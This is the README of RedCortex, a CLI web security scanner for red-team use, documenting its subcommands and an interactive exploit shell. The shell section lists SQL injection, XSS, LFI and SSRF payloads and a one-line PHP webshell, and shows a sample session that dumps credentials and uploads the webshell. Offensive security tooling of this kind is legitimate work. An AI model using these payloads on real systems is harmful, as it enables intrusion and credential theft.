# RedCortex

![GitHub Actions](https://img.shields.io/github/actions/workflow/status/Jadexzc/RedCortex/ci.yml?branch=main&style=flat-square&logo=github)
![Python Version](https://img.shields.io/badge/python-3.8%2B-blue?style=flat-square&logo=python)
![License](https://img.shields.io/github/license/Jadexzc/RedCortex?style=flat-square)
![Documentation](https://img.shields.io/badge/docs-wiki-brightgreen?style=flat-square)
![Version](https://img.shields.io/github/v/release/Jadexzc/RedCortex?style=flat-square)

## Overview

RedCortex is a **modular, CLI-driven web application security scanner** designed for red team operations and security research. The framework has been completely refactored to provide:

- **Modular Architecture**: Separated core functionality into independent modules (config, discovery, plugins, result, dashboard)
- **Dynamic Plugin System**: Load custom security checks from the `plugins/` directory
- **Structured Logging**: Comprehensive logging with verbosity controls and file output
- **Concurrent Scanning**: ThreadPoolExecutor-based endpoint scanning for improved performance
- **Flexible CLI**: Subcommand-based interface with comprehensive help documentation
- **Result Management**: Save, load, and generate reports from scan results
- **Web Dashboard**: Simple web interface to view and analyze scan results
- **Interactive Exploit Shell**: Advanced exploitation framework with attack chaining capabilities

---

## Quick Start

### Prerequisites

- Python 3.8+
- pip install -r requirements.txt

### Installation

```bash
# Clone the repository
git clone https://github.com/Jadexzc/RedCortex.git
cd RedCortex

# Install dependencies
pip install -r requirements.txt
```

### Basic Scan

Run a basic scan against a target URL:

```bash
python RedCortex.py scan https://example.com
```

### Scan with Custom Options

```bash
python RedCortex.py scan https://example.com \
  --threads 20 \
  --timeout 15 \
  -v  # Verbose output
```

---

## CLI Commands

### Scan Subcommand

Perform a new security scan:

```bash
python RedCortex.py scan <URL> [OPTIONS]

Options:
  -t, --threads INTEGER       Number of concurrent threads (default: 10)
  --timeout INTEGER           Request timeout in seconds (default: 30)
  --user-agent UA             Custom user agent string
  -s, --session FILE          Session file to save/load state
  -v, --verbose               Enable verbose output
  --log-file FILE             Write logs to FILE
```

**Example:**

```bash
python RedCortex.py scan https://target.com -t 20 --timeout 10 -v
```

### Resume Subcommand

Resume an interrupted scan:

```bash
python RedCortex.py resume <SCAN_ID> [OPTIONS]

Options:
  -t, --threads INTEGER       Override thread count
  --timeout INTEGER           Override timeout
```

**Example:**

```bash
python RedCortex.py resume 20241103_132000 -t 15
```

### Report Subcommand

Generate a report from scan results:

```bash
python RedCortex.py report <SCAN_ID> [OPTIONS]

Options:
  -f, --format [text|markdown]  Report format (default: text)
  -o, --output FILE             Save report to FILE (prints to stdout if not specified)
```

**Example:**

```bash
python RedCortex.py report 20241103_132000 -f markdown -o report.md
```

### Dashboard Subcommand

Start the web dashboard:

```bash
python RedCortex.py dashboard [OPTIONS]

Options:
  -p, --port PORT             Dashboard port (default: 8080)
```

**Example:**

```bash
python RedCortex.py dashboard -p 9000
```

### List Subcommand

List all available scans:

```bash
python RedCortex.py list
```

### Shell Subcommand (Interactive Exploit Shell)

Launch the interactive exploit shell for manual exploitation:

```bash
python RedCortex.py shell <SCAN_ID> [OPTIONS]

Options:
  -s, --session FILE          Session file to save/load state
```

**Example:**

```bash
python RedCortex.py shell 20241103_132000
```

---

## Interactive Exploit Shell

The Interactive Exploit Shell provides a powerful command-line interface for manual exploitation and attack chaining. After a scan completes, drop into the shell to manually craft and execute attacks against discovered vulnerabilities.

### Features

- **Auto-completion**: Tab completion for all commands
- **Command history**: Navigate previous commands with up/down arrows
- **Attack templates**: Pre-built payloads for common vulnerabilities (SQLi, XSS, LFI, etc.)
- **Custom headers**: Set custom HTTP headers for authentication bypass
- **File upload**: Upload webshells and malicious files
- **Attack chaining**: Automatically detect and chain credentials/tokens from responses
- **Multiple attack methods**: GET, POST, RAW, and multipart file uploads

### Installation (Additional Dependencies)

The interactive shell requires additional packages:

```bash
pip install prompt_toolkit requests_toolbelt
```

### Usage Workflow

1. **Run a scan** to discover vulnerabilities:

```bash
python RedCortex.py scan https://target.site
```

2. **Launch the shell** with the scan results:

```bash
python RedCortex.py shell 20241103_132000
```

3. **Inside the shell**, interact with discovered vulnerabilities:

```text
=== RedCortex Interactive Exploit Shell ===
[0] SQLi-Boolean ==> http://target/login.php (param: id)
[1] LFI ==> http://target/download.php (param: file)
```

### Shell Commands

| Command | Description | Example |
|---------|-------------|----------|
| `show` | Display all discovered vulnerabilities | `show` |
| `use <index>` | Select a target vulnerability | `use 0` |
| `get <param> <payload>` | Execute GET request | `get id ' OR 1=1--` |
| `post <param> <payload>` | Execute POST request (JSON) | `post cmd whoami` |
| `raw <param> <payload>` | Execute raw POST request | `raw data <shellcode>` |
| `upload <param> <filepath>` | Upload file via multipart | `upload file ./shell.php` |
| `header <Name>:<Value>` | Set custom HTTP header | `header Cookie:SESSION=abc123` |
| `clearheaders` | Reset custom headers | `clearheaders` |
| `template <type>` | Show payload template | `template xss` |
| `last` | Repeat last command | `last` |
| `history` | Show command history | `history` |
| `help` | Display help menu | `help` |
| `exit`, `quit` | Exit the shell | `exit` |

### Available Templates

- **sqli**: SQL injection payloads (`' OR 1=1--`)
- **xss**: Cross-Site Scripting (`<svg/onload=alert(1337)>`)
- **lfi**: Local File Inclusion (`../../etc/passwd`)
- **idor**: Insecure Direct Object Reference (`2`)
- **ssrf**: Server-Side Request Forgery (`http://127.0.0.1/`)
- **post_json**: JSON POST template
- **upload_php**: PHP webshell template

### Example Session

Here's a complete example of exploiting SQLi and chaining attacks:

```bash
$ python RedCortex.py shell 20241103_132000

=== RedCortex Interactive Exploit Shell ===
[0] SQLi-Boolean ==> http://target/login.php (param: id)
[1] LFI ==> http://target/download.php (param: file)

cmd> use 0
Now using: [0] http://target/login.php (param: id)

cmd> get id ' UNION SELECT user,pass FROM users--
[200] OK
user:admin pass:P@ssw0rd123 ...

[CHAIN] 🎯 Possible credentials found: [('admin', 'P@ssw0rd123')]
[Auto-Chain] Next commands will auto-apply found creds/cookies unless you 'clearheaders'.

cmd> header Cookie:sessionid=deadbeef
[+] Header set: Cookie = sessionid=deadbeef

cmd> get page admin_panel
[200] OK
[ESCALATE] Looks like an admin panel page! Try further privilege escalation or user dump?

cmd> template upload_php
[Template for upload_php]:
<?php system($_GET['cmd']); ?>

cmd> upload file ./shell.php
[+] UPLOAD POST http://target/upload.php param=file file=./shell.php
[200] OK
File uploaded successfully!

cmd> exit
```

### Pro Tips

- After the shell detects credentials or session tokens in responses, it **automatically adds them to headers** for subsequent requests (attack chaining)
- Use **up/down arrows** to navigate command history and modify previous exploits
- The `template` command shows ready-to-use payloads for quick exploitation
- Custom headers persist across commands until you run `clearheaders`
- The shell automatically detects admin panels and privilege escalation opportunities

---

## Configuration

RedCortex uses a modular configuration system. Key settings include:

- **Target URL**: The base URL to scan
- **Max Threads**: Number of concurrent workers (default: 10)
- **Timeout**: HTTP request timeout in seconds (default: 30)
- **User Agent**: Custom user agent string
- **Output Directory**: Location for scan results and reports

---

## Plugin Development

Create custom security checks by adding plugins to the `plugins/` directory:

```python
# plugins/custom_check.py

class CustomPlugin:
    def __init__(self, config):
        self.config = config
    
    def run(self, endpoint):
        # Your security check logic here
        return findings
```

Plugins are automatically discovered and loaded at runtime.

---

## Testing

Run the test suite:

```bash
# Run all tests
python -m pytest tests/

# Run with verbose output
python -m pytest tests/ -v

# Run specific test file
python tests/test_plugins.py
```

---

## Security and Legal

**IMPORTANT**: RedCortex is designed for authorized security testing only.

- Only use RedCortex against systems you own or have explicit written permission to test
- Unauthorized access to computer systems is illegal in most jurisdictions
- The developers assume no liability for misuse of this tool
- Review and comply with all applicable laws and regulations

---

## License

MIT License - see [LICENSE](LICENSE) file for details.

---

## Acknowledgments

- Security research community
- Open source security tools that inspired this project
- Contributors and testers

---

## Support

- **Issues**: Report bugs and request features via [GitHub Issues](https://github.com/Jadexzc/RedCortex/issues)
- **Discussions**: Ask questions in [GitHub Discussions](https://github.com/Jadexzc/RedCortex/discussions)
- **Wiki**: Additional documentation in the [Wiki](https://github.com/Jadexzc/RedCortex/wiki)

---

## Disclaimer

This tool is provided "as is" without warranty of any kind. Use at your own risk. Always obtain proper authorization before testing any systems.
